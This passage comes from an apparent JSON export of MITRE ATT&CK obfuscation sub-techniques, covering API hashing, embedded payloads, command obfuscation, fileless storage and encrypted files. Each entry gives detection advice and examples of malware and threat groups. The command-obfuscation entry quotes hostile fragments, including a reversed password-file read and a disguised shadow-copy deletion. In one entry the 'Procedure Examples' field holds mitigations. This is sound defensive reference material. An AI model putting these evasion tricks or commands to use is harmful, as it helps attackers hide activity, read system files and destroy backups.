ofDeobfuscate/Decode Files or Informationduring execution).[3][4][1]",
    "Detects": [
      "Depending on the method used to obfuscate API function calls, a file-based signature may be capable of detecting dynamical resolution.[1][3][16]",
      "Monitoring module loads, especially those not explicitly included in import tables, may highlight obfuscated API function calls. Dynamic malware analysis may also expose signs of function obfuscation, such as memory reads that correspond to addresses of API function code within modules.[3]",
      "Monitor and analyze calls to functions such asGetProcAddress()andLoadLibrary()that are associated with dynamically loading API functions.[1]"
    ],
    "Procedure Examples": [
      "AvosLockerhas used obfuscated API calls that are retrieved by their checksums.[5]",
      "Bazarcan hash then resolve API calls at runtime.[6][7]",
      "Brute Ratel C4can call and dynamically resolve hashed APIs.[8]",
      "CHIMNEYSWEEPcan useLoadLibraryandGetProcAddressto resolve Windows API function strings at run time.[9]",
      "Latrodectuscan resolve Windows APIs dynamically by hash.[10]",
      "Lazarus Grouphas used a custom hashing method to resolve APIs used in shellcode.[11]",
      "Pteranodoncan use a dynamic Windows hashing algorithm to map API components.[12]",
      "Raccoon Stealerdynamically links key WinApi functions during execution.[13][14]",
      "Samuraican encrypt API name strings with an XOR-based algorithm.[15]"
    ]
  },
  "T1027.008": {
    "Name": "Obfuscated Files or Information:Stripped Payloads",
    "Description": "Adversaries may attempt to make a payload difficult to analyze by removing symbols, strings, and other human readable information. Scripts and executables may contain variables names and other strings that help developers document code functionality. Symbols are often created by an operating system’slinkerwhen executable payloads are compiled. Reverse engineers use these symbols and strings to analyze code and to identify functionality in payloads.[1][2]Adversaries may use stripped payloads in order to make malware analysis more difficult. For example, compilers and other tools may provide features to remove or obfuscate strings and symbols. Adversaries have also used stripped payload formats, such as run-only AppleScripts, a compiled and stripped version ofAppleScript, to evade detection and analysis. The lack of human-readable information may directly hinder detection and analysis of payloads.[3]",
    "Detects": [
      "Detecting the presence of stripped payloads may be difficult and unwarranted in real-time, though analyzing contextual data about files (such as content and character entropy) may highlight attempts at obfuscation."
    ],
    "Procedure Examples": [
      "Cuckoo Stealeris a stripped binary payload.[4][5]",
      "macOS.OSAMinerhas used run-only Applescripts, a compiled and stripped version ofAppleScript, to remove human readable indicators to evade detection.[3]"
    ]
  },
  "T1027.009": {
    "Name": "Obfuscated Files or Information:Embedded Payloads",
    "Description": "Adversaries may embed payloads within other files to conceal malicious content from defenses. Otherwise seemingly benign files (such as scripts and executables) may be abused to carry and obfuscate malicious payloads and content. In some cases, embedded payloads may also enable adversaries toSubvert Trust Controlsby not impacting execution controls such as digital signatures and notarization tickets.[1]Adversaries may embed payloads in various file formats to hide payloads.[2]This is similar toSteganography, though does not involve weaving malicious content into specific bytes and patterns related to legitimate digital media formats.[3]For example, adversaries have been observed embedding payloads within or as an overlay of an otherwise benign binary.[4]Adversaries have also been observed nesting payloads (such as executables and run-only scripts) inside a file of the same format.[5]Embedded content may also be used asProcess Injectionpayloads used to infect benign system processes.[6]These embedded then injected payloads may be used as part of the modules of malware designed to provide specific features such as encrypting C2 communications in support of an orchestrator module. For example, an embedded module may be injected into default browsers, allowing adversaries to then communicate via the network.[7]",
    "Detects": [
      "Monitor for newly constructed files containing large amounts of data. Abnormal file sizes may be an indicator of embedded content.",
      "Monitor contextual data about a file that may highlight embedded payloads, which may include information such as name, the content (ex: signature, headers, or data/media), file size, etc.; correlate with other suspicious behavior to reduce false positives."
    ],
    "Procedure Examples": [
      "BADHATCHhas an embedded second stage DLL payload within the first stage of the malware.[8]",
      "ForC0021, the threat actors embedded a base64-encoded payload within a LNK file.[9]",
      "CHIMNEYSWEEPcan extract RC4 encrypted embedded payloads for privilege escalation.[10]",
      "ComRAThas embedded a XOR encrypted communications module inside the orchestrator module.[11][12]",
      "The DEADEYE.EMBED variant ofDEADEYEhas the ability to embed payloads inside of a compiled binary.[13]",
      "DEADWOODcontains an embedded, AES-encrypted payload labeledMETADATAthat provides configuration information for follow-on execution.[14]",
      "Dtrackhas used a dropper that embeds an encrypted payload as extra data.[15]",
      "DUSTPANdecrypts and executes an embedded payload.[16][17]",
      "DUSTTRAPcontains additional embedded DLLs and configuration files that are loaded into memory during execution.[16]",
      "Emotethas dropped an embedded executable at%Temp%\\setup.exe.[18]Additionally,Emotetmay embed entire code into other files.[19]",
      "IcedIDhas embedded malicious functionality in a legitimate DLL file.[20]",
      "Invoke-PSImagecan be used to embed payload data within a new image file.[3]",
      "Lazarus Grouphas distributed malicious payloads embedded in PNG files.[21]",
      "macOS.OSAMinerhas embeddedStripped Payloadswithin another run-onlyStripped Payloads.[5]",
      "Moneybirdcontains a configuration blob embedded in the malware itself.[22]",
      "Moonstone Sleetembedded payloads in trojanized software for follow-on execution.[23]",
      "MultiLayer Wipercontains two binaries in its resources section, MultiList and MultiWip.MultiLayer Wiperdrops and executes each of these items when run, then deletes them after execution.[24]",
      "Netwalker's DLL has been embedded within the PowerShell script in hex format.[25]",
      "Pikabotfurther decrypts information embedded via steganography using AES-CBC with the same 32 bit key as initial XOR operations combined with the first 16 bytes of the encrypted data as an initialization vector.[26]OtherPikabotvariants include encrypted, chunked sections of the stage 2 payload in the initial loader.textsection before decrypting and assembling these during execution.[27]",
      "TheSMOKEDHAMsource code is embedded in the dropper as an encrypted string.[28]",
      "TA577has used LNK files to execute embedded DLLs.[29]",
      "TheUroburosQueue file contains embedded executable files along with key material, communication channels, and modes of operation.[30]"
    ]
  },
  "T1027.010": {
    "Name": "Obfuscated Files or Information:Command Obfuscation",
    "Description": "Adversaries may obfuscate content during command execution to impede detection. Command-line obfuscation is a method of making strings and patterns within commands and scripts more difficult to signature and analyze. This type of obfuscation can be included within commands executed by delivered payloads (e.g.,PhishingandDrive-by Compromise) or interactively viaCommand and Scripting Interpreter.[1][2]For example, adversaries may abuse syntax that utilizes various symbols and escape characters (such as spacing,^,+.$, and%) to make commands difficult to analyze while maintaining the same intended functionality.[3]Many languages support built-in obfuscation in the form of base64 or URL encoding.[4]Adversaries may also manually implement command obfuscation via string splitting (\"Wor\"+\"d.Application\"), order and casing of characters (rev <<<'dwssap/cte/ tac'), globing (mkdir -p '/tmp/:&$NiA'), as well as various tricks involving passing strings through tokens/environment variables/input streams.[5][6]Adversaries may also use tricks such as directory traversals to obfuscate references to the binary being invoked by a command (C:\\voi\\pcw\\..\\..\\Windows\\tei\\qs\\k\\..\\..\\..\\system32\\erool\\..\\wbem\\wg\\je\\..\\..\\wmic.exe shadowcopy delete).[7]Tools such asInvoke-ObfuscationandInvoke-DOSfucationhave also been used to obfuscate commands.[8][9]",
    "Detects": [
      "Monitor executed commands and arguments for indicators of obfuscation and potentially suspicious syntax such as uninterpreted escape characters (e.g.,^).Also monitor command-lines for syntax-specific signs of obfuscation, such as variations of arguments associated with encoding.",
      "Scripts containing obfuscated content may have higher entropy of characters/strings.",
      "Monitor executed scripts for indicators of obfuscation and potentially suspicious command syntax, such as uninterpreted escape characters (e.g.,^).Also monitor commands within scripts for syntax-specific signs of obfuscation, such as encoded or otherwise unreadable blobs of characters."
    ],
    "Procedure Examples": [
      "APT19used Base64 to obfuscate executed commands.[10]",
      "APT32has used theInvoke-Obfuscationframework to obfuscate their PowerShell.[11][12][13]",
      "Aquatic Pandahas encoded PowerShell commands in Base64.[14]",
      "Astarothhas obfuscated and randomized parts of the JScript code it is initiating.[15]",
      "BackConfighas used compressed and decimal encoded VBS scripts.[16]",
      "BADHATCHmalicious PowerShell commands can be encoded with base64.[17]",
      "DuringC0018, the threat actors used Base64 to encode their PowerShell scripts.[18][19]",
      "DuringC0021, the threat actors used encoded PowerShell commands.[20][21]",
      "CARROTBAThas the ability to execute obfuscated commands on the infected host.[22]",
      "Chimerahas encoded PowerShell commands.[23]",
      "Cobalt Groupobfuscated several scriptlets and code used on the victim’s machine, including through use of XOR and RC4.[24][25]",
      "ComRAThas used encryption and base64 to obfuscate its orchestrator code in the Registry.ComRAThas also used encoded PowerShell scripts.[26][27]",
      "CookieMinerhas used base64 encoding to obfuscate scripts on the system.[28]",
      "DarkWatchmanhas used Base64 to encode PowerShell commands.[29]",
      "Denishas encoded its PowerShell commands in Base64.[13]",
      "Emotethas obfuscated macros within malicious documents to hide the URLs hosting the malware,  CMD.exe arguments, and PowerShell scripts.[30][31][32][33]",
      "Empirehas the ability to obfuscate commands usingInvoke-Obfuscation.[34]",
      "FIN6has used encoded PowerShell commands.[35]",
      "FIN7has used fragmented strings, environment variables, standard input (stdin), and native character-replacement functionalities to obfuscate commands.[6][36][37]",
      "FIN8has used environment variables and standard input (stdin) to obfuscate command-line arguments.FIN8also obfuscates malicious macros delivered as payloads.[6][38][39]",
      "Fox Kittenhas base64 encoded scripts to avoid detection.[40]",
      "DuringFrankenstein, the threat actors ran encoded commands from the command line.[41]",
      "FruitFlyexecutes and stores obfuscated Perl scripts.[42]",
      "Gamaredon Grouphas used obfuscated or encrypted scripts.[43][44]",
      "GOLD SOUTHFIELDhas executed base64 encoded PowerShell scripts on compromised hosts.[45]",
      "HEXANEhas used Base64-encoded scripts.[46]",
      "IceApplecan use Base64 and \"junk\" JavaScript code to obfuscate information.[47]",
      "KOCTOPUShas obfuscated scripts with the BatchEncryption tool.[48]",
      "LazyScripterhas leveraged the BatchEncryption tool to perform advanced batch script obfuscation and encoding techniques.[48]",
      "Leafminerobfuscated scripts that were used on victim machines.[49]",
      "LoudMinerhas obfuscated various scripts.[50]",
      "Machetehas used pyobfuscate, zlib compression, and base64 encoding for obfuscation.Machetehas also used some visual obfuscation techniques by naming variables as combinations of letters to hinder analysis.[51][52]",
      "Magic Houndhas used base64-encoded commands.[53][54]",
      "MuddyWaterhas used Daniel Bohannon’s Invoke-Obfuscation framework and obfuscated PowerShell scripts.[55][12]The group has also used other obfuscation methods, including Base64 obfuscation of VBScripts and PowerShell commands.[55][56][57][58][59][60][61]",
      "Netwalker's PowerShell script has been obfuscated with multiple layers including base64 and hexadecimal encoding and XOR-encryption, as well as obfuscated PowerShell functions and variables.[62][63]",
      "DuringOperation CuckooBees, the threat actors executed an encoded VBScript file.[64]",
      "DuringOperation Wocao, threat actors executed PowerShell commands which were encoded or compressed using Base64, zlib, and XOR.[65]",
      "Patchworkhas obfuscated a script with Crypto Obfuscator.[66]",
      "Playhas used Base64-encoded PowerShell scripts for post exploit activities on compromised hosts.[67]",
      "PoetRAThaspyminifierto obfuscate scripts.[68]",
      "PowerPunchcan use Base64-encoded scripts.[44]",
      "PowerSploitcontains a collection of ScriptModification modules that compress and encode scripts and payloads.[69][70]",
      "POWERSTATSuses character replacement,PowerShellenvironment variables, and XOR encoding to obfuscate code.POWERSTATS's backdoor code is a multi-layer obfuscated, encoded, and compressed blob.[56][71]POWERSTATShas used PowerShell code with custom string obfuscation[72]",
      "QakBotcan use obfuscated and encoded scripts.[73][74]",
      "QUADAGENTwas likely obfuscated usingInvoke-Obfuscation.[75][12]",
      "The PowerShell script with theRogueRobinpayload was obfuscated using the COMPRESS technique inInvoke-Obfuscation.[76][12]",
      "Sandworm Teamhas used ROT13 encoding, AES encryption and compression with the zlib library for their Python-based backdoor.[77]",
      "SardonicPowerShell scripts can be encrypted with RC4 and compressed using Gzip.[78]",
      "SHARPSTATShas used base64 encoding and XOR to obfuscate PowerShell scripts.[72]",
      "Sibothas obfuscated scripts used in execution.[79]",
      "Sidewinderhas used base64 encoding for scripts.[80][81]",
      "Silencehas used environment variable string substitution for obfuscation.[82]",
      "SQLRathas used a character insertion obfuscation technique, making the script appear to contain Chinese characters.[83]",
      "TA505has used base64 encoded PowerShell commands.[84][85]",
      "TA551has used obfuscated variable names in a JavaScript configuration file.[86]",
      "Turlahas used encryption (including salted 3DES viaPowerSploit'sOut-EncryptedScript.ps1), random variable names, and base64 encoding to obfuscate PowerShell commands and payloads.[87]",
      "Ursnifdroppers execute base64 encodedPowerShellcommands.[88]",
      "Wizard Spiderused Base64 encoding to obfuscate anEmpireservice and PowerShell commands.[89][90]",
      "Zeus Pandaobfuscates the macro commands in its initial payload.[91]"
    ]
  },
  "T1027.011": {
    "Name": "Obfuscated Files or Information:Fileless Storage",
    "Description": "Adversaries may store data in \"fileless\" formats to conceal malicious activity from defenses. Fileless storage can be broadly defined as any format other than a file. Common examples of non-volatile fileless storage in Windows systems include the Windows Registry, event logs, or WMI repository.[1][2]In Linux systems, shared memory directories such as/dev/shm,/run/shm,/var/run, and/var/lockmay also be considered fileless storage, as files written to these directories are mapped directly to RAM and not stored on the disk.[3][4][5]Similar to fileless in-memory behaviors such asReflective Code LoadingandProcess Injection, fileless data storage may remain undetected by anti-virus and other endpoint security tools that can only access specific file formats from disk storage. Leveraging fileless storage may also allow adversaries to bypass the protections offered by read-only file systems in Linux.[6]Adversaries may use fileless storage to conceal various types of stored data, including payloads/shellcode (potentially being used as part ofPersistence) and collected data not yet exfiltrated from the victim (e.g.,Local Data Staging). Adversaries also often encrypt, encode, splice, or otherwise obfuscate this fileless data when stored.Some forms of fileless storage activity may indirectly create artifacts in the file system, but in central and otherwise difficult to inspect formats such as the WMI (e.g.,%SystemRoot%\\System32\\Wbem\\Repository) or Registry (e.g.,%SystemRoot%\\System32\\Config) physical files.[1]",
    "Detects": [
      "In Linux systems, monitor for newly executed processes from shared memory directories such as/dev/shm,/run/shm,/var/run, and/var/lock.[3]",
      "Monitor for the creation of Registry values that may highlight storage of malicious data such as commands or payloads.",
      "Monitor for the creation of WMI Objects and values that may highlight storage of malicious data such as commands or payloads."
    ],
    "Procedure Examples": [
      "APT32's backdoor has stored its configuration in a registry key.[7]",
      "Some versions ofChaesstored its instructions (otherwise in ainstructions.inifile) in the Registry.[8]",
      "CHOPSTICKmay store RC4 encrypted configuration information in the Windows Registry.[9]",
      "ComRAThas stored encrypted orchestrator code and payloads in the Registry.[10][11]",
      "DarkWatchmancan store configuration strings, keylogger, and output of components in the Registry.[12]",
      "Exaramel for Windowsstores the backdoor's configuration in the Registry in XML format.[13]",
      "Gelsemiumcan store its components in the Registry.[14]",
      "Grandoreirocan store its configuration in the Registry atHKCU\\Software\\under frequently changing names including%USERNAME%andToolTech-RM.[15]",
      "Mosquitostores configuration values under the Registry keyHKCU\\Software\\Microsoft[dllname].[16]",
      "NETWIREcan store its configuration information in the Registry underHKCU:\\Software\\Netwire.[17]",
      "DuringOperation CuckooBees, the threat actors stroed payloads in Windows CLFS (Common Log File System) transactional logs.[18]",
      "Some versions ofPikabotbuild the final PE payload in memory to avoid writing contents to disk on the executing machine.[19]",
      "Pillowminthas stored a compressed payload in the Registry keyHKLM\\SOFTWARE\\Microsoft\\DRM.[20]",
      "PipeMonhas stored its encrypted payload in the Registry underHKLM\\SOFTWARE\\Microsoft\\Print\\Components\\.[21]",
      "PolyglotDukecan store encrypted JSON configuration files in the Registry.[22]",
      "QakBotcan store its configuration information in a randomly named subkey underHKCU\\Software\\Microsoft.[23][24]",
      "QUADAGENTstores a session identifier unique to the compromised system as well as a pre-shared key used for encrypting and decrypting C2 communications within a Registry key (such asHKCU\\Office365DCOMCheck) in theHKCUhive.[25]",
      "RCSessioncan store its obfuscated configuration file in the Registry underHKLM\\SOFTWARE\\PlusorHKCU\\SOFTWARE\\Plus.[26][27]",
      "RegDukecan store its encryption key in the Registry.[22]",
      "REvilcan save encryption parameters and system information in the Registry.[28][29][30][31][32]",
      "ShadowPadmaintains a configuration block and virtual file system in the Registry.[33][34]",
      "Sibothas installed a second-stage script in theHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\sibotregistry key.[35]",
      "SysUpdatecan store its encoded configuration file withinSoftware\\Classes\\scConfigin eitherHKEY_LOCAL_MACHINEorHKEY_CURRENT_USER.[36]",
      "ThreatNeedlecan save its configuration data as a RC4-encrypted Registry key underHKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\GameCon.[37]",
      "TinyTurlacan save its configuration parameters in the Registry.[38]",
      "Turlahas used the Registry to store encrypted and encoded payloads.[39][40]",
      "TYPEFRAMEcan install and store encrypted configuration data under the Registry keyHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\ShellCompatibility\\Applications\\laxhost.dllandHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\PrintConfigs.[41]",
      "Uroburoscan store configuration information for the kernel driver and kernel driver loader components in an encrypted blob typically found atHKLM:\\SOFTWARE\\Classes\\.wav\\OpenWithProgIds.[42]",
      "Valakhas the ability to store information regarding the C2 server and downloads in the Registry keyHKCU\\Software\\ApplicationContainer\\Appsw64.[43][44][45]",
      "Volgmerstores an encoded configuration file inHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Security.[46][47]"
    ]
  },
  "T1027.012": {
    "Name": "Obfuscated Files or Information:LNK Icon Smuggling",
    "Description": "Adversaries may smuggle commands to download malicious payloads past content filters by hiding them within otherwise seemingly benign windows shortcut files. Windows shortcut files (.LNK) include many metadata fields, including an icon location field (also known as theIconEnvironmentDataBlock) designed to specify the path to an icon file that is to be displayed for the LNK file within a host directory.Adversaries may abuse this LNK metadata to download malicious payloads. For example, adversaries have been observed using LNK files as phishing payloads to deliver malware. Once invoked (e.g.,Malicious File), payloads referenced via external URLs within the LNK icon location field may be downloaded. These files may also then be invoked byCommand and Scripting Interpreter/System Binary Proxy Executionarguments within the target path field of the LNK.[1][2]LNK Icon Smuggling may also be utilized post compromise, such as malicious scripts executing an LNK on an infected host to download additional malicious payloads.",
    "Detects": [
      "Monitor for downloaded malicious files, though developing rules for the different variants, with a combination of different encoding and/or encryption schemes, may be very challenging. Consider monitoring files downloaded from the Internet, possibly by LNK Icon Smuggling, for suspicious activities. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities.",
      "Monitor contextual data about a file that may highlight embedded malicious content, which may include information such as name, the content (ex: signature, headers, or data/media), file size, etc.; correlate with other suspicious behavior to reduce false positives."
    ],
    "Procedure Examples": [
      "Use signatures or heuristics to detect malicious LNK and subsequently downloaded files.",
      "On Windows 10, enable Attack Surface Reduction (ASR) rules to prevent execution of potentially obfuscated scripts or payloads."
    ]
  },
  "T1027.013": {
    "Name": "Obfuscated Files or Information:Encrypted/Encoded File",
    "Description": "Adversaries may encrypt or encode files to obfuscate strings, bytes, and other specific patterns to impede detection. Encrypting and/or encoding file content aims to conceal malicious artifacts within a file used in an intrusion. Many other techniques, such asSoftware Packing,Steganography, andEmbedded Payloads, share this same broad objective. Encrypting and/or encoding files could lead to a lapse in detection of static signatures, only for this malicious content to be revealed (i.e.,Deobfuscate/Decode Files or Information) at the time of execution/use.This type of file obfuscation can be applied to many file artifacts present on victim hosts, such as malware log/configuration and payload files.[1]Files can be encrypted with a hardcoded or user-supplied key, as well as otherwise obfuscated using standard encoding schemes such as Base64.The entire content of a file may be obfuscated, or just specific functions or values (such as C2 addresses). Encryption and encoding may also be applied in redundant layers for additional protection.For example, adversaries may abuse password-protected Word documents or self-extracting (SFX) archives as a method of encrypting/encoding a file such as aPhishingpayload. These files typically function by attaching the intended archived content to a decompressor stub that is executed when the file is invoked (e.g.,User Execution).[2]Adversaries may also abuse file-specific as well as custom encoding schemes. For example, Byte Order Mark (BOM) headers in text files may be abused to manipulate and obfuscate file content untilCommand and Scripting Interpreterexecution.",
    "Detects": [
      "Monitor for files with large entropy which don’t match what is normal/expected given the file type and location.",
      "Monitor for and analyze files which contain content with large entropy, as this may indicate potentially malicious encrypted data."
    ],
    "Procedure Examples": [
      "APT18obfuscates strings in the payload.[3]",
      "APT19used Base64 to obfuscate payloads.[4]",
      "APT28encrypted a .dll payload using RTL and a custom encryption algorithm.APT28has also obfuscated payloads with base64, XOR, and RC4.[5][6][7][8][9]",
      "APT32has performed code obfuscation, including encoding payloads using Base64 and using a framework called \"Dont-Kill-My-Cat (DKMC).APT32also encrypts the library used for network exfiltration with AES-256 in CBC mode in their macOS backdoor.[10][11][12][13][14][15][16]",
      "APT33has used base64 to encode payloads.[17]",
      "APT39has used malware to drop encrypted CAB files.[18]",
      "APT41 DUSTused encrypted payloads decrypted and executed in memory.[19]",
      "Aria-bodyhas used an encrypted configuration file for its loader.[20]",
      "Astarothhas used an XOR-based algorithm to encrypt payloads twice with different keys.[21]",
      "Strings inAttor's components are encrypted with a XOR cipher, using a hardcoded key and the configuration data, log files and plugins are encrypted using a hybrid encryption scheme of Blowfish-OFB combined with RSA.[22]",
      "AuditCredencrypts the configuration.[23]",
      "Avengerhas the ability to XOR encrypt files to be sent to C2.[24]",
      "Bazarhas used XOR, RSA2, and RC4 encrypted files.[25][26][27]",
      "BendyBearhas encrypted payloads using RC4 and XOR.[28]",
      "Bisonal's DLL file and non-malicious decoy file are encrypted with RC4 and some function name strings are obfuscated.[29][30]",
      "BitPaymerhas used RC4-encrypted strings and string hashes to avoid identifiable strings within the binary.[31]",
      "BITTERhas used a RAR SFX dropper to deliver malware.[32]",
      "BlackByte Ransomwareis distributed as an encrypted payload.[33]",
      "BLINDINGCANhas obfuscated code using Base64 encoding.[34]",
      "Blue Mockingbirdhas obfuscated the wallet address in the payload binary.[35]",
      "BLUELIGHThas a XOR-encoded payload.[36]",
      "BOOSTWRITEhas encoded its payloads using a ChaCha stream cipher with a 256-bit key and 64-bit Initialization vector (IV) to evade detection.[37]",
      "Carberphas used XOR-based encryption to mask C2 server locations within the trojan.[38]",
      "Cardinal RATencodes many of its artifacts and is encrypted (AES-128) when downloaded.[39]",
      "CARROTBAThas the ability to download a base64 encoded payload.[40]",
      "Chinoxyhas encrypted its configuration file.[41]",
      "Chrommmecan encrypt sections of its code to evade detection.[42]",
      "The payload ofCozyCaris encrypted with simple XOR with a rotating key. TheCozyCarconfiguration file has been encrypted with RC4 keys.[43]",
      "Cuckoo Stealerstrings are XOR-encrypted.[44][45]",
      "DuringCutting Edge, threat actors used a Base64-encoded Python script to write a patched version of the Ivanti Connect Securedslsbinary.[46]",
      "Daclscan encrypt its configuration file with AES CBC.[47]",
      "DanBotcan Base64 encode its payload.[48]",
      "Dark Caracalhas obfuscated strings inBandookby base64 encoding, and then encrypting them.[49]",
      "DarkGatedrops an encrypted PE file, pe.bin, and decrypts it during installation.[50]DarkGatealso uses custom base64 encoding schemas in later variations to obfuscate payloads.[51]",
      "Darkhotelhas obfuscated code using RC4, XOR, and RSA.[52][53]",
      "DCSrv's configuration is encrypted.[54]",
      "DEADEYEhas encrypted its payload.[55]",
      "DEADWOODcontains an embedded, AES-encrypted resource namedMETADATAthat contains configuration information for follow-on execution.[56]",
      "DOGCALLis encrypted using single-byte XOR.[57]",
      "Donutcan generate encrypted, compressed/encoded, or otherwise obfuscated code modules.[58]",
      "DUSTPANdecrypts an embedded payload.[19][59]",
      "DUSTTRAPbegins with an initial launcher that decrypts an AES-128-CFB encrypted file on disk and executes it in memory.[19]",
      "Elderwoodhas encrypted documents and malicious executables.[60]",
      "Eliseencrypts several of its files, including configuration files.[61]",
      "Variants ofEmissaryencrypt payloads using various XOR ciphers, as well as a custom algorithm that uses the \"srand\" and \"rand\" functions.[62][63]",
      "Emotetuses obfuscated URLs to download a ZIP file.[64]",
      "EnvyScoutcan Base64 encode payloads.[65]",
      "Exaramel for Linuxuses RC4 for encrypting the configuration.[66][67]",
      "FELIXROOTencrypts strings in the backdoor using a custom XOR algorithm.[68][69]",
      "TheFIVEHANDSpayload is encrypted with AES-128.[70][71][72]",
      "FlawedGraceencrypts its C2 configuration files with AES in CBC mode.[73]",
      "FoggyWebhas been XOR-encoded.[74]",
      "Fox Kittenhas base64 encoded payloads to avoid detection.[75]",
      "FunnyDreamcan Base64 encode its C2 address stored in a template binary with thexyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvw_-orxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvw_=character sets.[41]",
      "Fysbishas been encrypted using XOR and RC4.[76]",
      "Gazerlogs its actions into files that are encrypted with 3DES. It also uses RSA to encrypt resources.[77]",
      "GoldenSpy's uninstaller has base64-encoded its variables.[78]",
      "GoldMaxhas written AES-encrypted and Base64-encoded configuration files to disk.[79][80]",
      "TheGrandoreiropayload has been delivered encrypted with a custom XOR-based algorithm and also as a base64-encoded ZIP file.[21][81][81]",
      "GravityRATsupports file encryption (AES with the key \"lolomycin2017\").[82]",
      "GreyEnergyencrypts its configuration files with AES-256 and also encrypts its strings.[69]",
      "Group5disguised its malicious binaries with several layers of obfuscation, including encrypting the files.[83]",
      "HAWKBALLhas encrypted the payload with an XOR-based algorithm.[84]",
      "TheHelminthconfig file is encrypted with RC4.[85]",
      "HermeticWizardhas the ability to encrypt PE files with a reverse XOR loop.[86]",
      "Heyoka Backdoorcan encrypt its payload.[87]",
      "Hi-Zoruses various XOR techniques to obfuscate its components.[88]",
      "HiddenWaspencrypts its configuration and payload.[89]",
      "Higaisaused Base64 encoded compressed payloads.[90][91]",
      "Hildegardhas encrypted an ELF file.[92]",
      "Some strings inHOMEFRYare obfuscated with XOR x56.[93]",
      "HotCroissanthas encrypted strings with single-byte XOR and base64 encoded RC4.[94]",
      "HyperBrocan be delivered encrypted to a compromised host.[95]",
      "IcedIDhas utilzed encrypted binaries and base64 encoded strings.[96]",
      "Inceptionhas encrypted malware payloads dropped on victim machines with AES and RC4 encryption.[97]",
      "IPsec Helpercontains an embedded XML configuration file with an encrypted list of command and control servers. These are written to an external configuration file during execution.[56]",
      "IronNetInjectorcan obfuscate variable names, encrypt strings, as well as base64 encode and Rijndael encrypt payloads.[98]",
      "Many strings inJHUHUGITare obfuscated with a XOR algorithm.[99][100][8]",
      "Kapekautilizes AES-256 (CBC mode), XOR, and RSA-2048 encryption schemas for various configuration and other objects.[101]",
      "Kerrdowncan encrypt, encode, and compress multiple layers of shellcode.[102]",
      "Kessel's configuration is hardcoded and RC4 encrypted within the binary.[103]",
      "Kevinhas Base64-encoded its configuration file.[104]",
      "In one version ofKeyBoy, string obfuscation routines were used to hide many of the critical values referenced in the malware.[105]",
      "KEYPLUGcan use a hardcoded one-byte XOR encoded configuration file.[55]",
      "KGH_SPYhas used encrypted strings in its installer.[106]",
      "KONNIis heavily obfuscated and includes encrypted configuration files.[107]",
      "Kwampirsdownloads additional files that are base64-encoded and encrypted with another cipher.[108]",
      "Latrodectushas used a pseudo random number generator (PRNG) algorithm and a rolling XOR key to obfuscate strings.[109][110][111]",
      "Lazarus Grouphas used multiple types of encryption and encoding for their payloads, including AES, Caracachs, RC4, XOR, Base64, and other tricks such as creating aliases in code forNative APIfunction names.[112][113][114][115][47][116][117]",
      "Leviathanhas obfuscated code using base64.[118]",
      "LightNeuronencrypts its configuration files with AES-256.[119]",
      "LightSpyencrypts the C2 configuration file using AES with a static key, while the module.dylibfiles use a rolling one-byte encoding for obfuscation.[120]",
      "TheLockBit 3.0payload includes an encrypted main component.[121][122]",
      "LoudMinerhas encrypted DMG files.[123]",
      "Lumma Stealerhas used AES-encrypted payloads contained within PowerShell scripts.[124]",
      "LunarMailhas used RC4 and AES to encrypt strings and its exfiltration configuration respectively.[125]",
      "TheLunarWebinstall files have been encrypted with AES-256.[125]",
      "Mafaldahas been obfuscated and contains encrypted functions.[126]",
      "Magic Houndmalware has used base64-encoded files and has also encrypted embedded strings with AES.[127][128]",
      "MagicRATstores base64 encoded command and contorl URLs in a configuraiton file, with each URL prefixed with the valueLR02DPt22R.[129]",
      "Malteirohas used scripts encoded in Base64 certificates to distribute malware to victims.[130]",
      "Mangocontains a series of base64 encoded substrings.[131]",
      "menuPasshas encoded strings in its malware with base64 as well as with a simple, single-byte XOR obfuscation using key 0x40.[132][133][134]",
      "Metadorhas encrypted their payloads.[126]",
      "metaMain's module file has been encrypted via XOR.[135]",
      "Metamorfohas encrypted payloads and strings.[136][137]",
      "Micropsiaobfuscates the configuration with a custom Base64 and XOR.[138][139]",
      "Milancan encode files containing information about the targeted system.[140][104]",
      "Mispaduuses a custom algorithm to obfuscate its internal strings and uses hardcoded keys.[141]Mispadualso uses encoded configuration files and has encoded payloads using Base64.[141][142][130]",
      "Mofanghas encrypted payloads before they are downloaded to victims.[143]",
      "Moonstone Sleethas used encrypted payloads within files for follow-on execution and defense evasion.[144]",
      "More_eggs's payload has been encrypted with a key that has the hostname and processor family information appended to the end.[145]",
      "Moses Staffhas used obfuscated web shells in their operations.[54]",
      "Mosquito’s installer is obfuscated with a custom crypter to obfuscate the installer.[146]",
      "NanHaiShuencodes files in Base64.[147]",
      "DuringNight Dragon, threat actors used a DLL that included an XOR-encoded section.[148]",
      "TheNinjapayload is XOR encrypted and compressed.[149]Ninjahas also XORed its configuration data with a constant value of0xAA.[150][149]",
      "njRAThas included a base64 encoded executable.[151]",
      "OilRighas encrypted and encoded data in its malware, including by using base64.[152][153][154][155][156]",
      "DuringOperation Dream Job,Lazarus Groupencrypted malware such asDRATzaruswith XOR and DLL files with base64.[157][158][159][160]",
      "DuringOperation Dust Storm, the threat actors encoded some payloads with a single-byte XOR, both skipping the key itself and zeroing in an attempt to avoid exposing the key; other payloads were Base64-encoded.[161]",
      "DuringOperation Honeybee, the threat actors used Base64 to encode files with a custom key.[162]",
      "ForOperation Spalax, the threat actors used XOR-encrypted payloads.[163]",
      "OSX_OCEANLOTUS.Dencrypts its strings in RSA256 and encodes them in a custom base64 scheme and XOR.[164]",
      "DuringOuter Space,OilRigdeployed VBS droppers with obfuscated strings.[131]",
      "PcSharehas been encrypted with XOR using different 32-long Base16 strings.[41]",
      "Penquinhas encrypted strings in the binary for obfuscation.[165]",
      "PipeMonmodules are stored encrypted on disk.[166]",
      "Some resources inPrikormkaare encrypted with a simple XOR operation or encoded with Base64.[167]",
      "PS1is distributed as a set of encrypted files and scripts.[168]",
      "Droppers used byPutter Pandause RC4 or a 16-byte XOR key consisting of the bytes 0xA0 – 0xAF to obfuscate payloads.[169]",
